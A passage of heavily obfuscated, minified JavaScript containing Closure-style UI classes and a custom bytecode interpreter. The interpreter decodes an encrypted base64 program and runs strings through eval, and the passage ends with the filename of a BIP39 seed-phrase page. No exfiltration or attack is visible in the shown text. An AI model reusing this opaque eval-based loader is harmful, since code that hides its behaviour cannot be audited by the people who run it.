h$.call(this,0,T,7)},RH=function(T,w,p,R,h){if((R=(h=b.trustedTypes,p),!h)||!h.createPolicy)return R;try{R=h.createPolicy(w,{createHTML:aH,createScript:aH,createScriptURL:aH})}catch(k){if(b.console)b.console[T](k.message)}return R},ah=0,bq=function(T,w,p,R,h,k,a,D,Q,f,O,F,t){for(D=(h=[],Q=p);Q<w.length;Q++)t=w.charCodeAt(Q),128>t?h[D++]=t:(2048>t?h[D++]=(O=t>>6,191-(~O|T)):(55296==64512-(~t&64512)&&Q+1<w.length&&56320==(w.charCodeAt(Q+1)&64512)?(t=(R=1-~(t|1023)+(t^1023)+2*(~t^1023)<<10,-~(65536&R)+-2-~R+(65536&~R))+(w.charCodeAt(++Q)&1023),h[D++]=t>>18|240,h[D++]=(a=t>>12&63,256-~(a&128)+-258-(~a^128))):h[D++]=(F=t>>12,224-(~F^224)+(F|-225)),h[D++]=(k=(f=t>>6,64+(f&-64)+(~f^63)),-257-3*~(k|128)+2*(~k|128))),h[D++]=t&63|128);return h},lq=function(T,w){if(!b.addEventListener||!Object.defineProperty)return false;w=Object.defineProperty({},(T=false,"passive"),{get:function(){T=true}});try{b.addEventListener("test",wt,w),b.removeEventListener("test",wt,w)}catch(p){}return T}(),zf=function(T,w){return r.call(this,19,22,T,w)},BX=function(){return Ih.call(this,10,9)},Kr=(zf.prototype.preventDefault=function(){this.defaultPrevented=true},BX.prototype.kX=false,zf.prototype.stopPropagation=function(){this.S=true},function(T,w,p,R,h){return J$.call(this,0,h,p,T,R,5,w)}),XJ={2:"touch",3:"pen",4:(V("",Kr,zf,2,10),"mouse")},kZ=(Kr.prototype.stopPropagation=(Kr.prototype.preventDefault=function(T){(T=(Kr.Z.preventDefault.call(this),this.K),T).preventDefault?T.preventDefault():T.returnValue=false},function(){(Kr.Z.stopPropagation.call(this),this).K.stopPropagation?this.K.stopPropagation():this.K.cancelBubble=true}),"closure_listenable_")+(1E6*Math.random()|0),Tc=function(T,w,p,R,h){return $Z.call(this,466,7,h,R,T,p,w)},vX=0,MD="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" "),YZ=function(T){return Ih.call(this,10,20,T)},fr="closure_lm_"+(1E6*((YZ.prototype.hasListener=function(T,w,p,R,h){return $Z(466,12,false,(h=(R=(p=void 0!==w,void 0!==T))?T.toString():"",true),this.T,function(k,a){for(a=0;a<k.length;++a)if(!(R&&k[a].type!=h||p&&k[a].capture!=w))return true;return false})},((YZ.prototype.jG=function(T,w,p,R,h,k){return(h=(k=this.T[R.toString()],-1),k&&(h=yW(T,p,w,0,k,5)),-1)<h?k[h]:null},YZ.prototype).add=function(T,w,p,R,h,k,a,D,Q){return-1<(k=yW(w,h,R,((a=(D=T.toString(),this.T[D]),a)||(a=this.T[D]=[],this.B++),0),a,12),k)?(Q=a[k],p||(Q.N=false)):(Q=new Tc(this.src,D,w,h,!!R),Q.N=p,a.push(Q)),Q},YZ).prototype).remove=function(T,w,p,R,h,k,a){if(h=T.toString(),!(h in this.T))return false;return-(a=yW(w,R,p,0,(k=this.T[h],k),9),1)<a?(OC(16,8,true,k[a]),Array.prototype.splice.call(k,a,1),0==k.length&&(delete this.T[h],this.B--),true):false},Math.random())|0),QW=0,A$=function(T,w,p,R,h,k){return h$.call(this,0,T,8,w,p,R,h,k)},jR={},Rh="__closure_events_fn_"+(1E9*Math.random()>>>0),e=function(){return xZ.call(this,7,8)},pQ=((((((V("",e,BX,2,14),e).prototype[kZ]=true,e).prototype.Ca=function(T){this.Ha=T},e.prototype.addEventListener=function(T,w,p,R){G(10,0,false,5,R,p,T,w,this)},e).prototype.removeEventListener=function(T,w,p,R){yW(this,R,w,0,T,6,p)},e).prototype.dispatchEvent=function(T,w,p,R,h,k,a,D,Q,f,O,F){if(w=this.Ha)for(h=[],F=1;w;w=w.Ha)h.push(w),++F;if(D=((Q=(k=(f=(a=h,T),this.di),f.type||f),"string"===typeof f)?f=new zf(f,k):f instanceof zf?f.target=f.target||k:(R=f,f=new zf(Q,k),ZW(f,R)),true),a)for(p=a.length-1;!f.S&&0<=p;p--)O=f.currentTarget=a[p],D=U(f,9,0,O,true,Q)&&D;if(f.S||(O=f.currentTarget=k,D=U(f,25,0,O,true,Q)&&D,f.S||(D=U(f,57,0,O,false,Q)&&D)),a)for(p=0;!f.S&&p<a.length;p++)O=f.currentTarget=a[p],D=U(f,41,0,O,false,Q)&&D;return D},e.prototype.jG=function(T,w,p,R){return this.W.jG(T,w,p,String(R))},e.prototype).hasListener=function(T,w){return this.W.hasListener(void 0!==T?String(T):void 0,w)},function(T){return h$.call(this,0,T,21)}),hK=function(T,w,p,R,h,k,a,D,Q,f){function O(F){F&&h.appendChild("string"===typeof F?p.createTextNode(F):F)}for(D=k;D<w.length;D++)if(f=w[D],!xZ(7,10,a,"object","number",f)||y(40,null,f)&&f.nodeType>T)O(f);else{a:{if(f&&"number"==typeof f.length){if(y(20,null,f)){Q="function"==typeof f.item||"string"==typeof f.item;break a}if("function"===typeof f){Q="function"==typeof f.item;break a}}Q=false}OC(16,3,R,T,Q?Cr(0,5,T,f):f,O)}},Lr=function(){return c.call(this,8)},nr,ku=((((((E=Lr.prototype,E).M=function(T){return"string"===typeof T?this.L.getElementById(T):T},E.getElementsByTagName=function(T,w){return(w||this.L).getElementsByTagName(String(T))},E).createElement=function(T,w,p){return("application/xhtml+xml"===(p=(w=this.L,String(T)),w.contentType)&&(p=p.toLowerCase()),w).createElement(p)},E).createTextNode=function(T){return this.L.createTextNode(String(T))},E.appendChild=function(T,w){T.appendChild(w)},E).append=function(T,w){hK(0,arguments,9==T.nodeType?T:T.ownerDocument||T.document,"",T,1,"array")},E.canHaveChildren=function(T){if(1!=T.nodeType)return false;switch(T.tagName){case "APPLET":case "AREA":case "BASE":case "BR":case "COL":case "COMMAND":case "EMBED":case "FRAME":case "HR":case "IMG":case "INPUT":case "IFRAME":case "ISINDEX":case "KEYGEN":case "LINK":case "NOFRAMES":case "NOSCRIPT":case "META":case "OBJECT":case "PARAM":case "SCRIPT":case "SOURCE":case "STYLE":case "TRACK":case "WBR":return false}return true},E.removeNode=pQ,E).contains=function(T,w,p){if(!T||!w)return false;if(T.contains&&1==w.nodeType)return T==w||T.contains(w);if("undefined"!=typeof T.compareDocumentPosition)return T==w||!!(p=T.compareDocumentPosition(w),-~p+(~p^16)+(~p&16));for(;w&&T!=w;)w=w.parentNode;return w==T},function(){return OC.call(this,16,18)}),A=((qD(8,9,ku),ku).prototype.YX="",function(T){return h$.call(this,0,T,48)}),Dn=((((((V("",A,e,2,(ku.prototype.y9=0,15)),A.prototype).DR=ku.V(),A).prototype.M=function(){return this.Wa},A).prototype.getParent=function(){return this.ri},A.prototype.Y=function(){this.SG=(U(this,13,function(T){T.SG&&T.Y()}),this.Ka&&OC(16,21,0,this.Ka),false)},A.prototype).Ca=function(T){if(this.ri&&this.ri!=T)throw Error("Method not supported");A.Z.Ca.call(this,T)},A).prototype.removeChild=function(T,w,p,R,h,k,a,D,Q,f,O,F){if(T&&("string"===typeof T?O=T:((f=T.Oq)||(h=T,k=T.DR,a=k.YX+":"+(k.y9++).toString(36),f=h.Oq=a),O=f),F=O,this.Gs&&F?(D=this.Gs,p=(null!==D&&F in D?D[F]:void 0)||null):p=null,T=p,F&&T)){if(Q=((y(11,(F in(R=this.Gs,R)&&delete R[F],0),T,this.af),w)&&(T.Y(),T.Wa&&pQ(T.Wa)),T),null==Q)throw Error("Unable to set parent component");A.Z.Ca.call(Q,(Q.ri=null,null))}if(!T)throw Error("Child is not in parent component");return T},function(){return t$.call(this,3,16)}),QI=function(T,w,p,R,h){return c.call(this,28,T,w,p,R,h)},fQ=function(T,w){return xZ.call(this,7,27,T,w)},OM,sM=(qD(8,14,Dn),function(){return y.call(this,6)}),FC={button:"pressed",checkbox:(E=Dn.prototype,E.JY=function(T,w,p,R,h,k,a){((R=(h=(OM||(OM={1:"disabled",8:"selected",16:"checked",64:"expanded"}),OM[w]),T.getAttribute("role"))||null)?(k=FC[R]||h,a="checked"==h||"selected"==h?k:h):a=h,a)&&J$(0,p,T,"aria-",a,10," ")},E.lF=function(T){return T.M()},E.D=function(T,w,p,R){(R=w.M?w.M():w)&&(p?QI:fQ)(R,[T])},E.Eq=function(T,w,p,R,h,k){if(G(10,32,T,14)&&(R=T.lF())){if(!w&&U(32,24,0,T)){try{R.blur()}catch(a){}U(32,8,0,T)&&(r(19,5,T,4)&&T.setActive(false),r(19,27,T,32)&&Ih(10,24,8,T,32,false)&&T.P(32,false))}if(p=R.hasAttribute("tabindex"))h=R.tabIndex,p="number"===typeof h&&0<=h&&32768>h;p!=w&&(k=R,w?k.tabIndex=0:(k.tabIndex=-1,k.removeAttribute("tabIndex")))}},"checked"),menuitem:"selected",menuitemcheckbox:"checked",menuitemradio:"checked",radio:"checked",tab:"selected",treeitem:"selected"},pr=(qD(8,19,(V("",sM,Dn,2,(E.qr=function(){return"goog-control"},E.P=function(T,w,p,R,h,k){if(h=T.M())this.tY||(k=this.qr(),k.replace(/\\xa0|\\s/g," "),this.tY={1:k+"-disabled",2:k+"-hover",4:k+"-active",8:k+"-selected",16:k+"-checked",32:k+"-focused",64:k+"-open"}),(R=this.tY[w])&&this.D(R,T,p),this.JY(h,w,p)},11)),sM)),sM.prototype.JY=function(T,w,p){switch(w){case 8:case 16:J$(0,p,T,"aria-","pressed",8," ");break;default:case 64:case 1:sM.Z.JY.call(this,T,w,p)}},{}),I=(sM.prototype.qr=function(){return"goog-button"},function(T,w,p,R,h,k,a,D){return G.call(this,10,T,w,9,p,R,h,k,a,D)});if(((((((V("",I,A,2,10),E=I.prototype,E.rJ=0,E).Y=function(){((I.Z.Y.call(this),this).V9&&this.V9.detach(),this.isVisible())&&this.isEnabled()&&this.A.Eq(this,false)},E.Nr=255,E.gJ=39,E).lF=function(){return this.A.lF(this)},E).X=0,E.Jm=true,E.l=null,E).D=function(T,w){T?w&&(this.l?0<=C(14,this.l,18,0,w)||this.l.push(w):this.l=[w],this.A.D(w,this,true)):w&&this.l&&y(3,0,w,this.l)&&(0==this.l.length&&(this.l=null),this.A.D(w,this,false))},E.isVisible=function(){return this.Jm},E).isEnabled=function(){return!U(1,12,0,this)},E.setActive=function(T){Ih(10,18,8,this,4,T)&&this.P(4,T)},E.getState=function(){return this.X},I.prototype).P=function(T,w,p,R,h,k,a){p||1!=T?G(10,T,this,46)&&w!=U(T,20,0,this)&&(this.A.P(this,T,w),this.X=w?(k=this.X,-~(k|T)+(~k&T)+(k|~T)):(a=this.X,2*(a|0)-~(a&~T)- -1+2*~a)):(h=!w,R=this.getParent(),R&&"function"==typeof R.isEnabled&&!R.isEnabled()||!Ih(10,6,8,this,1,!h)||(h||(this.setActive(false),Ih(10,30,8,this,2,false)&&this.P(2,false)),this.isVisible()&&this.A.Eq(this,h),this.P(1,!h,true)))},"function"!==typeof I)throw Error("Invalid component class "+I);if("function"!==typeof Dn)throw Error("Invalid renderer class "+Dn);var tK=Tf(4,I,6),FJ=(pr[tK]=Dn,DW(4,function(){return new I(null)},"goog-control",16),function(){return $Z.call(this,466,9)}),AK=((qD(8,24,(V("",FJ,sM,2,5),FJ)),FJ).prototype.Eq=wt,function(T,w,p){return t$.call(this,3,15,T,w,p)}),l=(((FJ.prototype.JY=(FJ.prototype.P=function(T,w,p,R){FJ.Z.P.call(this,T,w,p),(R=T.M())&&1==w&&(R.disabled=p)},wt),V)("",AK,I,2,5),DW)(4,function(){return new AK(null)},"goog-button",12),Z.prototype.kd=function(T,w,p,R,h,k){try{R=T[(-2*~(w|2)+(w&-3)+(~w^2)+(~w|2))%3],T[w]=(k=T[w],h=T[((w|0)+1)%3],-2*(k&h)-2*~(k&h)+(k^h)+2*(k|~h))-(R|0)^(1==w?R<<p:R>>>p)}catch(a){throw a;}},function(T,w,p){if(236==T||136==T)if(p.J[T])p.J[T][p.H](w);else p.J[T]=p.La(w);else if(83!=T&&55!=T&&88!=T&&87!=T&&229!=T||!p.J[T])p.J[T]=p.Pa(T,w);92==T&&H(23,19,2,236,p)}),mE=[],CQ=function(T,w,p,R,h,k,a,D){for(k=(h=(D=(a=(R={},L(p)),R.If=L(p),R.F=[],p.g==p?(L(p)|T)-w:1),L)(p),T);k<D;k++)R.F.push(L(p));for(R.xX=B(h,p);D--;)R.F[D]=B(R.F[D],p);return R.eG=B(a,p),R},di=((E=Z.prototype,Z.prototype).$d=void 0,function(T,w,p,R){if(R>=p.C)throw[jD,31];return l(236,-(R|8)+w*(R&8)+T*(R^8),p),p.O[R>>w]}),yI=[],dt=function(T,w,p,R,h,k,a,D,Q,f,O,F){try{for(O=0;-1541868384!==O;)h=(h|0)+((F=(p<<4|0)^p>>>5,~F+~p-4*~(F|p)+2*(~F^p))^(O|0)+(T[3-~(O&3)+-4]|0))|0,O=O+2233517989|0,p=(p|0)+(a=((h<<4|0)^h>>>5)+(h|0),D=(k=T[Q=O>>>11,-~(Q&3)+(Q^3)-(~Q&3)+(~Q|3)],-2*~(O|k)+(O^k)+2*(~O^k)),-2-(a|~D)-(~a|D))|0;return[h>>>w,h>>16&R,h>>8&R,h&R,p>>>w,p>>16&R,(f=p>>8,(f|0)+~(f&R)- -256-(f^R)),-1-~p-(p^R)+(~p&R)]}catch(t){throw t;}};(E.aY=function(){return VW.call(this,2,8)},E.Gi=function(){return VW.call(this,2,21)},E).pg=(Z.prototype.sq=false,function(T,w,p,R,h,k,a){return r.call(this,19,6,T,w,p,R,h,k,a)});var z,cP=((E.i=(window.performance||{}).now?function(){return this.hY+window.performance.now()}:function(){return+new Date},Z).prototype.H="toString",[]),HX=[],M=function(T,w,p,R){for(p=(w|(R=[],0))-1;0<=p;p--)R[~(w&1)-~w-(~w&1)-(p|0)]=T>>8*p&255;return R},Gc=function(T,w,p,R,h,k){return(iP(95,true,"\\n",((k=B(T,R),R).O&&k<R.C?(l(T,R.C,R),gt(R,p,T)):l(T,p,R),R),h,w),l)(T,k,R),B(226,R)},L=function(T,w,p,R,h,k,a){if(T.j)return WP(T,T.s);return h=((k=(R=(w=B(236,T),w)>>3,di(2,3,T,w)),T.o!=R>>3)&&(T.o=R>>3,a=B(92,T),T.ma=dt([0,0,a[1],a[2]],24,T.o,255,T.v)),T.ma)[p=T[iq].length,2*(R|0)- -2+~R+(~R|p)],-(k&h)-~(k|h)+(~k&h)+(k|~h)},gt=(Z.prototype.Cg=void 0,Z.prototype.Uq=function(T,w,p,R,h,k){return H.call(this,23,17,w,T,p,R,h,k)},function(T,w,p){T.Xb.push(T.J.slice()),T.J[p]=void 0,l(p,w,T)}),rt=(Z.prototype.Ts=function(T,w){return H.call(this,23,10,w,T)},[]),cX=function(T,w,p,R,h){if(h=typeof w,"object"==h)if(w){if(w instanceof Array)return p;if(w instanceof Object)return h;if("[object Window]"==(R=Object.prototype.toString.call(w),R))return"object";if("[object Array]"==R||"number"==typeof w.length&&"undefined"!=typeof w.splice&&"undefined"!=typeof w.propertyIsEnumerable&&!w.propertyIsEnumerable("splice"))return p;if("[object Function]"==R||"undefined"!=typeof w.call&&"undefined"!=typeof w.propertyIsEnumerable&&!w.propertyIsEnumerable("call"))return"function"}else return T;else if("function"==h&&"undefined"==typeof w.call)return"object";return h},Yu=function(T,w,p,R,h,k,a,D,Q,f,O,F){if(k=(D=(0==(h=B(87,((F=void 0,R&&R[0]===jD)&&(F=R[2],T=R[1],R=void 0),w)),h).length&&(O=B(136,w)>>3,h.push(T,(f=O>>8,-~(f&255)+(f^255)+(~f^255)),O&255),void 0!=F&&h.push(F&255)),""),R&&(R.message&&(D+=R.message),R.stack&&(D+=":"+R.stack)),B(110,w)),3<k){a=(D=bq(192,(D=D.slice(0,-1-(~k^3)-2*(~k&3)),k-=(Q=D.length,-~(Q&3)-~(Q|3)+2*(Q^3)+2*(~Q^3)),D.replace(/\\r\\n/g,p)),0),w).g,w.g=w;try{P(M(D.length,2).concat(D),w,55,144)}finally{w.g=a}}l(110,k,w)},PX=function(T,w,p,R,h,k){for(w.s=((w.ZR=0,(h=[],w.Fb=(w.Pa=function(a,D,Q,f,O,F){return eR.call(this,Q,13,f,a,D,O,F)},25),w).Rf=1,w.La=function(a,D,Q){return WX.call(this,8,6,Q,a,D)},(k=0,w).U=(w.AY=[],null),w).$X=((w.zs=0,w).iF=(w.j=void 0,0),w.ba=xu,w.Ps=IH,false),void 0);128>k;k++)h[k]=String.fromCharCode(k);(W(22,0,w,(W((W(12,0,w,(w.Ws=(w.O=(((((((((((w.hY=(R=((((new AK((((w.Hs=(((w.gi=!(((l(236,(w.Mr=(w.g=w,w.J=[],w.fa=function(a){return VW.call(this,2,10,a)},[]),0),w),l)(136,0,w),l)(121,function(a){zc(4,a)},w),1),l)(11,0,w),l)(239,function(a,D,Q,f,O,F){(D=(F=(O=(Q=L(a),L)(a),L(a)),B(O,a)),f=B(Q,a),l)(F,f in D|0,a)},w),l(202,function(a){WX(8,3,4,0,a)},w),0),l(138,w,w),w).wi=false,l(247,function(a,D,Q,f,O){(D=(f=(O=L(a),L(a)),0)!=B(O,a),Q=B(f,a),D)&&l(236,Q,a)},w),l(209,function(a,D,Q,f){if(D=a.Xb.pop()){for(f=L(a);0<f;f--)Q=L(a),D[Q]=a.J[Q];D[D[87]=a.J[87],110]=a.J[110],a.J=D}else l(236,a.C,a)},w),l)(46,function(a,D,Q){Q=(D=L(a),B(D,a)),Q[0].removeEventListener(Q[1],Q[2],false)},w),l(94,function(a){zc(1,a)},w),"Submit")),l(229,[0,0,0],w),l)(83,[57,0,0],w),l(199,function(a,D,Q,f){f=(D=(Q=L(a),L)(a),L(a)),l(f,B(Q,a)||B(D,a),a)},w),l(222,function(){},w),l(166,function(a){a.uF(4)},w),l(110,2048,w),l(55,w.Ts(4),w),l)(219,function(a,D,Q,f,O,F,t){if((F=(O=H(23,13,a,(f=L(a),127)),""),a).J[233])for(D=B(233,a),t=D.length,Q=0;O--;)Q=((Q|0)+(H(23,5,a,127)|0))%t,F+=h[D[Q]];else for(;O--;)F+=h[L(a)];l(f,F,a)},w),l(163,function(a,D,Q,f,O){D=(Q=L(a),L(a)),O=B(Q,a),f=cX("null",O,"array"),l(D,f,a)},w),l(95,331,w),l(194,function(a,D,Q,f,O,F){O=(D=(Q=(F=L(a),L(a)),L(a)),B(F,a)),f=B(Q,a),l(D,O[f],a)},w),l)(220,function(a,D,Q,f,O,F,t,g,d,Y,v,n,X,x,m,S,u,sC){for(F=(X=(S=(t=(n=(m=L(a),f=D=0,function(J,N,K,q){for(;D<J;)f=(K=L(a)<<D,2*(K|0)-~(f&K)+2*~K-(~f^K)),D+=8;return N=(q=(1<<J)-1,(D-=J,-2*~q)+~(f|q)+(f&~q)+(f|~q)),f>>=J,N}),O=n(3),-2*~(O|1)+(O|-2)+(~O|1)),n(5)),x=0),[]);x<S;x++)g=n(1),F.push(g),X+=g?0:1;for(Q=(d=(-(X&1)- -2+2*(X|-2)-(~X|1)).toString(2).length,0),Y=[];Q<S;Q++)F[Q]||(Y[Q]=n(d));for(u=0;u<S;u++)F[u]&&(Y[u]=L(a));for(v=(sC=t,[]);sC--;)v.push(B(L(a),a));l(m,function(J,N,K,q,ri){for(q=(N=(K=[],0),[]);N<S;N++){if(ri=Y[N],!F[N]){for(;ri>=K.length;)K.push(L(J));ri=K[ri]}q.push(ri)}(J.j=J.Pa(47,v.slice()),J).s=J.Pa(47,q)},a)},w),window.performance)||{},R.timeOrigin)||(R.timing||{}).navigationStart||0,l)(114,b,w),l(255,function(a,D,Q,f,O,F,t){W(33,14,D,true,a,false)||(t=CQ(0,1,a),Q=t.xX,F=t.If,f=t.eG,O=t.F,(a.g==a||f==a.fa&&Q==a)&&l(F,f.apply(Q,O),a))},w),l(151,function(a,D,Q,f){W(48,14,D,true,a,false)||(f=L(a),Q=L(a),l(Q,function(O){return eval(O)}(XC(B(f,a.g))),a))},w),l(242,function(a,D,Q,f,O,F,t,g,d){W(16,14,D,true,a,false)||(Q=CQ(0,1,a.g),g=Q.If,t=Q.eG,d=Q.F,O=d.length,F=Q.xX,f=0==O?new F[t]:1==O?new F[t](d[0]):2==O?new F[t](d[0],d[1]):3==O?new F[t](d[0],d[1],d[2]):4==O?new F[t](d[0],d[1],d[2],d[3]):2(),l(g,f,a))},w),l(82,function(a,D,Q,f,O){O=(Q=(f=L(a),L(a)),B)(f,a),D=B(Q,a),l(Q,D+O,a)},w),l(14,function(a,D,Q,f){(Q=(f=L(a),L(a)),D=L(a),l)(D,B(f,a)>>>Q,a)},w),l)(120,function(a,D,Q,f,O,F,t,g,d,Y){(t=(Q=(D=(Y=(O=(g=(f=L(a),L(a)),L(a)),L)(a),B(f,a.g)),B)(Y,a),B(O,a)),d=B(g,a),0!==D)&&(F=eR(a,14,Q,1,2,1,t,D,d),D.addEventListener(d,F,KQ),l(230,[D,d,F],a))},w),l)(226,{},w),l(87,[],w),l)(74,function(a,D,Q,f,O,F,t){Q=(D=(O=L(a),L)(a),L)(a),a.g==a&&(F=B(O,a),f=B(D,a),t=B(Q,a),F[f]=t,92==O&&(a.o=void 0,2==f&&H(23,11,2,236,a)))},w),w).E_=0,l)(7,function(a,D){gt((D=B(L(a),a),a.g),D,236)},w),l(80,function(a,D,Q){D=(Q=L(a),L)(a),l(D,""+B(Q,a),a)},w),l(142,function(a,D,Q,f,O,F,t,g){(Q=(F=(t=(O=(g=(D=L(a),L(a)),L(a)),L)(a),f=B(g,a),B)(O,a),B(t,a)),l)(D,eR(a,21,F,1,2,Q,f),a)},w),w).Xb=[],l(221,function(a){a.uF(3)},w),l(134,function(a,D,Q,f,O,F){O=(f=(F=(D=L(a),L)(a),Q=L(a),B(F,a)),B(D,a)==f),l(Q,+O,a)},w),l(88,[],w),l)(20,function(a,D,Q,f,O){for(Q=(O=(D=H(23,37,(f=L(a),a),127),[]),0);Q<D;Q++)O.push(L(a));l(f,O,a)},w),w).R=[],w.jL=0,l)(230,0,w),l(118,function(a,D,Q,f,O,F,t,g,d,Y,v,n,X,x){if(!W(17,14,D,true,a,true)){if((x=(n=(d=(X=(Y=(v=(g=L(a),L)(a),L)(a),L)(a),B(Y,a)),B(X,a)),B(g,a)),F=B(v,a),"object")==cX("null",x,"array")){for(Q in f=[],x)f.push(Q);x=f}for(t=(O=(d=0<d?d:1,x.length),0);t<O;t+=d)F(x.slice(t,(t|0)+(d|0)),n)}},w),[]),function(a,D,Q,f,O,F){return H.call(this,23,8,D,a,Q,f,O,F)}),w.C=0,[yI])),72),0,w,[nQ,T]),[cP,p])),Gf)(false,w,true,true,true)},nQ=[],jD={},gi=[],iq=[],SR=(E.la=function(T,w,p,R,h,k,a,D){return C.call(this,14,p,5,T,w,R,h,k,a,D)},function(T,w,p,R,h,k,a,D,Q,f){if((D=p[0],w).$X=T,D==gi)w.Fb=25,w.$(p);else if(D==iq){h=p[1];try{a=w.G||w.$(p)}catch(O){c(32,":",O,w),a=w.G}h(a)}else if(D==HX)w.$(p);else if(D==nQ)w.$(p);else if(D==cP){try{for(Q=0;Q<w.Mr.length;Q++)try{f=w.Mr[Q],f[0][f[1]](f[2])}catch(O){}}catch(O){}(0,(w.Mr=[],p)[1])(function(O,F){w.Uq(O,true,F)},function(O){(W(52,0,(O=!w.R.length,w),[rt]),O)&&Gf(false,w,true,T,true)})}else{if(D==mE)return k=p[2],l(223,p[6],w),l(R,k,w),w.$(p);D==rt?(w.O=[],w.AY=[],w.J=null):D==yI&&"loading"===b.document.readyState&&(w.U=function(O,F,t){b.document.addEventListener("DOMContentLoaded",(F=T,t=function(){F||(F=true,O())},t),KQ),b.addEventListener("load",t,KQ)})}}),oh=b.requestIdleCallback?function(T){requestIdleCallback(function(){T()},{timeout:4})}:b.setImmediate?function(T){setImmediate(T)}:function(T){setTimeout(T,0)},iP=(Z.prototype.RY=function(T,w,p,R,h){if(3==T.length){for(R=0;3>R;R++)w[R]+=T[R];for(p=[13,(h=0,8),13,12,16,5,3,10,15];9>h;h++)w[3](w,h%3,p[h])}},function(T,w,p,R,h,k,a,D,Q,f){if(!R.G){R.ZR++;try{for(Q=(D=(f=void 0,R.C),0);(R.sq||--k)&&(R.j||(Q=B(236,R))<D);)try{a=void 0,R.j?f=WP(R,R.j):(l(136,Q,R),a=L(R),f=B(a,R)),f&&f.call?f(R,k):Yu(0,R,p,[jD,21,a]),R.$X=w,W(49,14,k,false,R,false)}catch(O){B(T,R)?Yu(22,R,p,O):l(T,O,R)}k||Yu(0,R,p,[jD,33])}catch(O){try{Yu(22,R,p,O)}catch(F){c(33,h,F,R)}}R.ZR--}}),UC=[],P=function(T,w,p,R,h,k,a,D,Q){if(w.g==w)for(k=B(p,w),55==p?(Q=function(f,O,F,t,g,d){if((F=(d=k.length,1+(d^4)-(~d&4)+(d|-5)>>3),k.va)!=F){O=[0,0,a[1],a[2]],t=(g=F<<3,2*(g|4)- -3+-10+((k.va=F,~g)^4));try{k.Q9=dt(O,24,eR(2*(t&4)- -1+2*(t^4)+(~t^4),8,k,8,16),255,eR(t,38,k,8,16))}catch(Y){throw Y;}}k.push(k.Q9[-~(d&7)- -1+2*(d&-8)+2*(~d|7)]^f)},a=B(229,w)):Q=function(f){k.push(f)},R&&Q(R&255),D=0,h=T.length;D<h;D++)Q(T[D])},B=function(T,w,p,R,h,k){if((h=w.J[T],void 0)===h)throw[jD,30,T];return h(13335*((((k=(k=((k=(k=p=(k=T|0,R=(k*k|0)%3173|0,(((R*R|0)%3173|0)*k|0)%3173|0),k=(k*k|0)%3173|0,k*k|0)%3173|0,k)*k|0)%3173|0,(k*k|0)%3173|0),k*k|0)%3173|0)*p|0)%3173|0))},KQ=!(E.Z3=function(T,w,p,R,h,k){return U.call(this,w,3,T,p,R,h,k)},1),WP=function(T,w,p){return(p=w(426720).shift(),T.j(426720)).length||T.s(426720).length||(T.j=void 0,T.s=void 0),p};Z.prototype.$=function(T,w){return T=(w={},{}),function(p,R,h,k,a,D,Q,f,O,F,t,g,d,Y,v,n,X,x,m,S,u,sC,J,N,K){T=(Q=T,w);try{if(f=p[0],f==UC)return Q==w?25:70;if(f==nQ){D=p[1];try{for(Y=O=(sC=(x=[],atob(D)),0);O<sC.length;O++)F=sC.charCodeAt(O),255<F&&(x[Y++]=-(F|255)-2*~F+(F^255)+2*(~F|255),F>>=8),x[Y++]=F;l(92,[0,0,0],((this.O=x,this).C=this.O.length<<3,this))}catch(q){Yu(17,this,"\\n",q);return}iP(95,true,"\\n",this,":",8001)}else if(f==gi)p[1].push(B(55,this).length,B(110,this),B(88,this).length,B(83,this).length),l(226,p[2],this),this.J[177]&&Gc(236,8001,B(177,this),this,":");else{if(f==iq){g=M((a=B(83,(X=p[2],this)).length,-2*~(a&2)-(~a^2)+3*(~a&2)+3*(a|-3)),2),v=this.g,this.g=this;try{n=B(87,this),0<n.length&&P(M(n.length,2).concat(n),this,83,147),P(M(this.Rf,1),this,83,244),P(M(this[iq].length,1),this,83),m=0,d=B(55,this),m+=(h=B(11,this),(h|2047)-~(h&2047)+~(h|2047)),m-=(B(83,this).length|0)+5,4<d.length&&(m-=(K=d.length,-2-2*~(K|3)-(K^3))),0<m&&P(M(m,2).concat(this.Ts(m)),this,83,150),4<d.length&&P(M(d.length,2).concat(d),this,83,5)}finally{this.g=v}if(t=this.Ts(2).concat(B(83,this)),t[1]=t[0]^159,t[3]=(k=t[1],N=g[0],(N|0)-(k&N)+(k&~N)),t[4]=t[1]^g[1],R=this.Ba(t))R="$"+R;else for(R="",S=0;S<t.length;S++)u=t[S][this.H](16),1==u.length&&(u="0"+u),R+=u;return((J=R,B(55,this).length=X.shift(),l(110,X.shift(),this),B(88,this)).length=X.shift(),B(83,this)).length=X.shift(),J}if(f==HX)Gc(236,p[2],p[1],this,":");else if(f==mE)return Gc(236,8001,p[1],this,":")}}finally{T=Q}}}();var xu,zc=(Z.prototype.Ba=(Z.prototype.Ti=0,function(T,w,p,R,h){return V.call(this,"",w,p,T,6,R,h)}),function(T,w,p,R){(R=(p=L(w),L)(w),P)(M(B(p,w),T),w,R)}),JK=(xu=function(T,w,p){return w=L(T),p=L(T),-1+~w-~(w|p)-(~w|p)},function(T,w,p,R,h,k,a,D,Q,f){for(;k.R.length;){f=(k.U=p,k.R.pop());try{Q=SR(false,k,f,R)}catch(O){c(T,h,O,k)}if(a&&k.U){D=k.U,D(function(){Gf(false,k,w,w,true)});break}}return Q}),IH,Gf=function(T,w,p,R,h,k,a,D){if(w.R.length){w.gi&&0(),w.gi=h,w.wi=p;try{k=w.i(),w.pa=k,w.ca=k,w.na=0,a=JK(16,true,null,226,":",w,p),D=w.i()-w.pa,w.zs+=D,D<(R?0:10)||0>=w.Fb--||(D=Math.floor(D),w.AY.push(254>=D?D:254))}finally{w.gi=T}return a}},XC=function(T,w){return(w=RH("error","ad",null))&&1===T.eval(w.createScript("1"))?function(p){return w.createScript(p)}:function(p){return""+p}}((((IH=/./,Z.prototype[cP]=[0,0,1,1,0,1,1],Z).prototype.uF=function(T,w,p,R,h,k){return eR.call(this,p,9,R,w,T,h,k)},Z).bind&&(xu[Z.prototype.H]=nQ.pop.bind(Z.prototype[gi]),IH[Z.prototype.H]=nQ.pop.bind(Z.prototype[gi])),b));(40<(z=b.trayride||(b.trayride={}),z.m)||(z.m=41,z.ad=EC,z.a=uq),z).hqW_=function(T,w,p){return p=new Z(w,T),[function(R){return Ih(10,7,false,R,p)}]};try{z.u||(b.addEventListener("unload",function(){},KQ),z.u=1)}catch(T){}try{b.addEventListener("test",null,Object.defineProperty({},"passive",{get:function(){KQ={passive:true}}}))}catch(T){};}).call(this);'));}).call(this);
bip39-standalone.html
